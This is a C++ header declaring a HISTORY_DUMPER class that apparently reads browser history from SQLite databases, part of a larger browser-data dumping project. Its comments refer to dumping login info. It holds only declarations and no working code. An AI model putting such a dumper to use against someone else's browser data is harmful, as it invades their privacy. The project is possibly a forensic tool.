#pragma once
#ifndef HISTORY_DUMPER_H
#define HISTORY_DUMPER_H

#include "DUMPER.h"
#include <string>
#include <vector>
#include <winsqlite/winsqlite3.h>

// Structure to save login info
struct HISTORY_ENTRY {
  std::string AccessTime;
  __int64 URL_Index;
};

// Class to dump login info
class HISTORY_DUMPER : public DUMPER {
private:
  std::vector<std::string> URL;
  std::vector<HISTORY_ENTRY> History;
  static int __stdcall AddURL(void *, int, char **, char **);
  static int __stdcall AddEntry(void *, int, char **, char **);

public:
  HISTORY_DUMPER() {}
  ~HISTORY_DUMPER() {}

  int Dump() override;
  int Show() override;
};

#endif // !HISTORY_DUMPER_H
